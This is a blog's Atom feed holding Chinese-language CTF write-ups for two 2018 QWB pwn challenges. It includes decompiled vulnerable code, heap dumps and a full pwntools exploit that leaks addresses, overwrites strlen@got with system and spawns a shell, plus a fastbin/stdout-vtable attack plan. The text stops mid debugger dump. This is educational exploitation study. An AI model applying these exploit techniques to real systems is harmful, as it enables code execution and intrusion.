<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kir[A]</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-04-12T08:35:00.146Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>kira</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>qwb-pwn-opm</title>
    <link href="http://yoursite.com/2018/04/12/qwb-pwn-opm/"/>
    <id>http://yoursite.com/2018/04/12/qwb-pwn-opm/</id>
    <published>2018-04-12T08:33:24.000Z</published>
    <updated>2018-04-12T08:35:00.146Z</updated>
    
    <content type="html"><![CDATA[<h3 id="opm"><a href="#opm" class="headerlink" title="opm"></a>opm</h3><p>首先学习一下在IDA创建结构体，<a href="https://blog.csdn.net/hgy413/article/details/7104304" target="_blank" rel="noopener">https://blog.csdn.net/hgy413/article/details/7104304</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00000000 role            struc ; (sizeof=0x20, mappedto_6)</span><br><span class="line">00000000 func            dq ?</span><br><span class="line">00000008 name            dq ?</span><br><span class="line">00000010 length          dq ?</span><br><span class="line">00000018 punch_num       dq ?</span><br><span class="line">00000020 role            ends</span><br></pre></td></tr></table></figure><p>按y重新设置类型后，add_role()伪代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">role *<span class="title">add_role</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  role *v0; <span class="comment">// rbx</span></span><br><span class="line">  role *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line">  role *v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-1A0h]</span></span><br><span class="line">  role *v6; <span class="comment">// [rsp+80h] [rbp-120h]</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// [rsp+100h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+188h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = (role *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  sub_56544D04DE2C((__int64)v0);                <span class="comment">// 初始化结构体</span></span><br><span class="line">  v6 = v0;</span><br><span class="line">  v0-&gt;func = (__int64)show;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Your name:"</span>);</span><br><span class="line">  gets(&amp;s);                                     <span class="comment">// 溢出点</span></span><br><span class="line">  v1 = v6;</span><br><span class="line">  v1-&gt;length = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  v7 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(v2);</span><br><span class="line">  <span class="built_in">strcpy</span>(v7, &amp;s);</span><br><span class="line">  v6-&gt;name = (__int64)v7;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"N punch?"</span>);</span><br><span class="line">  gets(&amp;s);                                     <span class="comment">// 溢出点</span></span><br><span class="line">  v3 = v6;</span><br><span class="line">  LODWORD(v3-&gt;punch_num) = atoi(&amp;s);</span><br><span class="line">  show((__int64)v6);</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>思路：gets可以覆盖v6（注意gets会在末位加上’\x00’），第一个溢出点可以改变结构体存放的地址，第二溢出点可以用于泄露地址。</p><p><strong>具体利用过程</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">'A'</span>*<span class="number">0x70</span>,<span class="number">1</span>)  <span class="comment">#padding</span></span><br><span class="line">add(<span class="string">'B'</span>*<span class="number">0x80</span>+<span class="string">"\x10"</span>,<span class="number">2</span>) <span class="comment">#role1</span></span><br><span class="line">add(<span class="string">'C'</span>*<span class="number">0x80</span>,<span class="string">'3'</span>+<span class="string">'D'</span>*<span class="number">0x7f</span>+<span class="string">'\x10'</span>) <span class="comment">#role2</span></span><br></pre></td></tr></table></figure><p>程序在heap上会有个很大的chunk，所以覆盖v6的最低位，或者倒数第二为\x00，指针仍然在heap上。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/8gx 0x5603fb8e5000</span><br><span class="line">0x5603fb8e5000:0x00000000000000000x0000000000011c11</span><br><span class="line">0x5603fb8e5010:0x0000000000011c000x0000000000000000</span><br></pre></td></tr></table></figure></p><p>首先正常创建一个role0（用来调整堆的位置，让role1-&gt;name在可控范围范围内）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x55877d5ee000+0x11c10</span><br><span class="line">0x55877d5ffc10:0x00000000000000000x0000000000000031</span><br><span class="line">0x55877d5ffc20:0x000055877c368b30-&gt;func0x000055877d5ffc50-&gt;name</span><br><span class="line">0x55877d5ffc30:0x0000000000000070-&gt;len 0x0000000000000001-&gt;punch</span><br><span class="line">0x55877d5ffc40:0x00000000000000000x0000000000000081</span><br><span class="line">0x55877d5ffc50:0x41414141414141410x4141414141414141-&gt;存放name的chunk</span><br><span class="line">0x55877d5ffc60:0x41414141414141410x4141414141414141</span><br></pre></td></tr></table></figure></p><p>然后创建一个role1，输入name的时候v6被覆盖成<code>xxxx0010</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/4gx 0x55877c56a0e0</span><br><span class="line">0x55877c56a0e0:0x000055877d5ffc20-&gt;role00x000055877d5f0010-&gt;role1</span><br><span class="line">0x55877c56a0f0:0x000055877d5f0010-&gt;role20x0000000000000000</span><br></pre></td></tr></table></figure><p>由于v6被覆盖，只有func存到正确位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x55877d5ffcc0:0x00000000000000000x0000000000000031</span><br><span class="line">0x55877d5ffcd0:0x000055877c368b30-&gt;func0x0000000000000000</span><br><span class="line">0x55877d5ffce0:0x0000000000000000        0x0000000000000000</span><br><span class="line">0x55877d5ffcf0:0x00000000000000000x0000000000000091</span><br><span class="line">0x55877d5ffd00:0x42424242424242420x4242424242424242-&gt;存放name的chunk</span><br><span class="line">0x55877d5ffd10:0x42424242424242420x4242424242424242</span><br></pre></td></tr></table></figure></p><p>其余部分存放到<code>0x000055877d5f0010</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/8gx 0x000055877d5f0010</span><br><span class="line">0x55877d5f0010:0x00000000000000000x000055877d5ffd00-&gt;name</span><br><span class="line">0x55877d5f0020:0x00000000000000810x0000000000000003</span><br></pre></td></tr></table></figure></p><p>创建一个role2，第一次溢出覆盖v6最低位为<code>xxxxxx00</code>，本来应为<code>0x55877d5ffd90</code>，变成了<code>0x55877d5ffd00</code>，而这个地址是role1存放name的chunk。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x55877d5ffd80:0x00000000000000100x0000000000000031</span><br><span class="line">0x55877d5ffd90:0x000055877c368b300x0000000000000000</span><br><span class="line">0x55877d5ffda0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55877d5ffdb0:0x00000000000000000x0000000000000091</span><br><span class="line">0x55877d5ffdc0:0x43434343434343430x4343434343434343-&gt;name</span><br><span class="line">0x55877d5ffdd0:0x43434343434343430x4343434343434343</span><br></pre></td></tr></table></figure></p><p>重新查看role1的heap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x55877d5ffd00:0x42424242424242420x000055877d5ffdc0-&gt;role1的name地址</span><br><span class="line">0x55877d5ffd10:0x00000000000000800x4242424242424242</span><br></pre></td></tr></table></figure></p><p>第二次溢出覆盖v6最低位为<code>xxxx0010</code>，那么v6变成<code>0x000055877d5f0010</code>，这个地址是role1的地址，函数结束时候show就会把role1-&gt;name打印出来，此时role-&gt;name有heap的地址。</p><p>有了heap地址，就可以伪造role泄露函数地址，<code>0x000055877d5ffdc0-0x30</code>就是role2-&gt;func的地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(&apos;E&apos;*8+p64(heap-0x30),str(131441).ljust(0x80,&apos;F&apos;)+p64(heap+0xc0))</span><br></pre></td></tr></table></figure><p>创建一个role3，利用role3-&gt;name进行伪造role，role3-&gt;name[0]当作func，role3-&gt;name[1]填入role2-&gt;func的地址<code>0x000055877d5ffdc0-0x30</code>，在第二个溢出点修改v6为fake role的地址<code>0x000055877d5ffdc0+0xc0</code>，由于punch num的输入会破坏top chunk，所以需要计算此时正确的数值，并输入。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原来top chunk:0x201c1</span><br><span class="line">新建role3后申请了0x30+0x20的空间</span><br><span class="line">此时top chunk:0x201c1-0x50 = 0x20171 = 131441</span><br></pre></td></tr></table></figure></p><p>完成role3创建后heap结构：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/64gx 0x55877d5ffd80</span><br><span class="line">0x55877d5ffd80:0x00000000000000100x0000000000000031 ----&gt;role2</span><br><span class="line">0x55877d5ffd90:0x000055877c368b300x0000000000000000</span><br><span class="line">0x55877d5ffda0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55877d5ffdb0:0x00000000000000000x0000000000000091</span><br><span class="line">0x55877d5ffdc0:0x43434343434343430x4343434343434343 ----&gt;role2-&gt;name</span><br><span class="line">0x55877d5ffdd0:0x43434343434343430x4343434343434343</span><br><span class="line">0x55877d5ffde0:0x43434343434343430x4343434343434343</span><br><span class="line">0x55877d5ffdf0:0x43434343434343430x4343434343434343</span><br><span class="line">0x55877d5ffe00:0x43434343434343430x4343434343434343</span><br><span class="line">0x55877d5ffe10:0x43434343434343430x4343434343434343</span><br><span class="line">0x55877d5ffe20:0x43434343434343430x4343434343434343</span><br><span class="line">0x55877d5ffe30:0x43434343434343430x4343434343434343</span><br><span class="line">0x55877d5ffe40:0x00000000000000000x0000000000000031 ----&gt;role3</span><br><span class="line">0x55877d5ffe50:0x000055877c368b300x000055877d5ffe80</span><br><span class="line">0x55877d5ffe60:0x000000000000000e0x0000000000000000</span><br><span class="line">0x55877d5ffe70:0x00000000000000000x0000000000000021</span><br><span class="line">0x55877d5ffe80:0x45454545454545450x000055877d5ffd90 ----&gt;role3-&gt;name # fake role</span><br><span class="line">0x55877d5ffe90:0x00000000000000000x0000000000020171 ----&gt;top chunk</span><br></pre></td></tr></table></figure></p><p>同理可以泄漏libc地址，然后利用第二个溢出点覆盖v6为strlen@got地址，通过写入punch num修改低8位地址为system地址或者onegadget地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./opm'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,n)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'(E)'</span>,<span class="string">'A'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'name:'</span>,name)</span><br><span class="line">    p.recvuntil(<span class="string">'punch?'</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">    p.sendline(str(n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'(E)'</span>,<span class="string">'S'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./opm'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">add(<span class="string">'A'</span>*<span class="number">0x70</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="string">'B'</span>*<span class="number">0x80</span>+<span class="string">'\x10'</span>,<span class="number">2</span>)</span><br><span class="line">add(<span class="string">'C'</span>*<span class="number">0x80</span>,<span class="string">'3'</span>+<span class="string">'D'</span>*<span class="number">0x7f</span>+<span class="string">'\x10'</span>)</span><br><span class="line"><span class="comment"># leak heap addr</span></span><br><span class="line">p.recvuntil(<span class="string">'B'</span>*<span class="number">8</span>)</span><br><span class="line">heap = u64((p.recvuntil(<span class="string">'&gt;'</span>,drop=<span class="keyword">True</span>)).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(hex(heap))</span><br><span class="line"><span class="comment"># leak elf base</span></span><br><span class="line">add(<span class="string">'E'</span>*<span class="number">8</span>+p64(heap<span class="number">-0x30</span>),str(<span class="number">131441</span>).ljust(<span class="number">0x80</span>,<span class="string">'F'</span>)+p64(heap+<span class="number">0xc0</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&lt;'</span>)</span><br><span class="line">func = u64((p.recvuntil(<span class="string">'&gt;'</span>,drop=<span class="keyword">True</span>)).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">elf.address = func<span class="number">-0xb30</span></span><br><span class="line">success(hex(elf.address)) </span><br><span class="line"><span class="comment"># leak libc base</span></span><br><span class="line">add(<span class="string">'G'</span>*<span class="number">8</span>+p64(elf.got[<span class="string">'strlen'</span>]),str(<span class="number">131441</span><span class="number">-0x30</span><span class="number">-0x20</span>).ljust(<span class="number">0x80</span>,<span class="string">'H'</span>)+p64(heap+<span class="number">0xc0</span>+<span class="number">0x30</span>+<span class="number">0x20</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&lt;'</span>)</span><br><span class="line">strlen_addr = u64((p.recvuntil(<span class="string">'&gt;'</span>,drop=<span class="keyword">True</span>)).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc.address = strlen_addr - libc.symbols[<span class="string">'strlen'</span>]</span><br><span class="line">success(hex(libc.address))</span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">add(<span class="string">'I'</span>*<span class="number">0x10</span>,str(libc.symbols[<span class="string">'system'</span>]&amp;<span class="number">0xffffffff</span>).ljust(<span class="number">0x80</span>,<span class="string">'J'</span>)+p64(elf.got[<span class="string">'strlen'</span>]<span class="number">-0x18</span>))</span><br><span class="line">add(<span class="string">'/bin/sh\x00'</span>,<span class="string">'5'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p>后来发现fake role向前移0x8就不会破坏top chunk，修改如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak elf addr</span></span><br><span class="line">add(p64(heap<span class="number">-0x30</span>),<span class="string">''</span>.ljust(<span class="number">0x80</span>,<span class="string">'F'</span>)+p64(heap+<span class="number">0xc0</span><span class="number">-0x8</span>))</span><br><span class="line"><span class="comment"># leak libc base</span></span><br><span class="line">add(p64(elf.got[<span class="string">'strlen'</span>]),<span class="string">''</span>.ljust(<span class="number">0x80</span>,<span class="string">'H'</span>)+p64(heap+<span class="number">0xc0</span>+<span class="number">0x30</span>+<span class="number">0x20</span><span class="number">-0x8</span>))</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;opm&quot;&gt;&lt;a href=&quot;#opm&quot; class=&quot;headerlink&quot; title=&quot;opm&quot;&gt;&lt;/a&gt;opm&lt;/h3&gt;&lt;p&gt;首先学习一下在IDA创建结构体，&lt;a href=&quot;https://blog.csdn.net/hgy413/article/deta
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>qwb-pwn-raisepig</title>
    <link href="http://yoursite.com/2018/04/12/qwb-pwn-raisepig/"/>
    <id>http://yoursite.com/2018/04/12/qwb-pwn-raisepig/</id>
    <published>2018-04-12T08:32:54.000Z</published>
    <updated>2018-04-12T08:36:53.264Z</updated>
    
    <content type="html"><![CDATA[<h3 id="raisepig"><a href="#raisepig" class="headerlink" title="raisepig"></a>raisepig</h3><p>跟pwnable.tw的Secret Garden非常似。菜单有5个选项：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">puts(&quot;1 . Raise a pig &quot;);</span><br><span class="line">puts(&quot;2 . Visit pigs &quot;);</span><br><span class="line">puts(&quot;3 . Eat a pig&quot;);</span><br><span class="line">puts(&quot;4 . Eat the whole Pig Farm&quot;);</span><br><span class="line">puts(&quot;5 . Leave the Farm&quot;);</span><br></pre></td></tr></table></figure></p><p>IDA中建一个pig的结构体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00000000 pigs            struc ; (sizeof=0x28, mappedto_6)</span><br><span class="line">00000000 inuse           dq ?</span><br><span class="line">00000008 name            dq ?</span><br><span class="line">00000010 type            dq 3 dup(?)</span><br><span class="line">00000028 pigs            ends</span><br></pre></td></tr></table></figure><p>漏洞点在<code>Eat a pig</code>，inuse位清0，free掉name，在free前仅仅检查了pig_list是否存在，并且没有在free后对指针进行清空，存在UAF，可以double free。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">eat_one</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( pig_num )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Which pig do you want to eat:"</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">0x63</span> || !pig_list[v1] )           <span class="comment">// 没有检查inuse</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    srand(<span class="number">0</span>);</span><br><span class="line">    LODWORD(pig_list[v1]-&gt;inuse) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)pig_list[v1]-&gt;name);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No pig"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>Eat the whole Pig Farm</code>会free掉所有还存在的pig，并且pig_list中指针清零。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x63</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( pig_list[i] &amp;&amp; !LODWORD(pig_list[i]-&gt;inuse) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(pig_list[i]);</span><br><span class="line">    pig_list[i] = <span class="number">0L</span>L;</span><br><span class="line">    --pig_num;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>首先要泄露出libc的地址，分配一个满足unsortedbin大小的chunk，然后free掉，然后再申请一个同样大小的堆，由于是用read读入的，输入结束没有<code>\x00</code>，name填满8字节，打印的时候就会把后面bk的内容打印出来。之后可以考虑使用fastbin attack改写<code>__malloc_hook</code>或者<code>__free_hook</code>为one gadget。</p><p><code>__malloc_hook</code>附近找到一个0x70大小的位置，然而本题环境使用malloc是没法达到one gadget执行需求。重复<code>free</code>同一个内存能触发<code>malloc_printerr</code>, 并调用<code>malloc</code>。然而触发<code>malloc_printerr</code>或直接调用<code>malloc</code>都getshell失败。</p><p>可行姿势为：利用fastbin attack攻击<code>Stdout</code>的file结构<code>_IO_2_1_stdout_</code>，更改<code>stdout</code>的<code>vtable</code>指向one_gadget。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_2_1_stdout_</span><br><span class="line">$1 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72537977, </span><br><span class="line">    _IO_read_ptr = 0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_read_end = 0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_read_base = 0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_base = 0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_ptr = 0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_end = 0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_buf_base = 0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_buf_end = 0x7f23b5af66a4 &lt;_IO_2_1_stdout_+132&gt; &quot;&quot;, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x7f23b5af58e0 &lt;_IO_2_1_stdin_&gt;, </span><br><span class="line">    _fileno = 1, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = -1, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;\n&quot;, </span><br><span class="line">    _lock = 0x7f23b5af7780 &lt;_IO_stdfile_1_lock&gt;, </span><br><span class="line">    _offset = -1, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x7f23b5af57a0 &lt;_IO_wide_data_1&gt;, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = -1, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7f23b5af46e0 &lt;_IO_file_jumps&gt;  &lt;-- 修改这里指向我们伪造的vtable</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>&lt;_IO_file_jumps&gt;</code>在<code>0x7f23b5af66f8</code>处<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32a 0x7f23b5af6620</span><br><span class="line">0x7f23b5af6620 &lt;_IO_2_1_stdout_&gt;:0xfbad28870x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt;</span><br><span class="line">0x7f23b5af6630 &lt;_IO_2_1_stdout_+16&gt;:0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt;0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt;</span><br><span class="line">0x7f23b5af6640 &lt;_IO_2_1_stdout_+32&gt;:0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt;0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt;</span><br><span 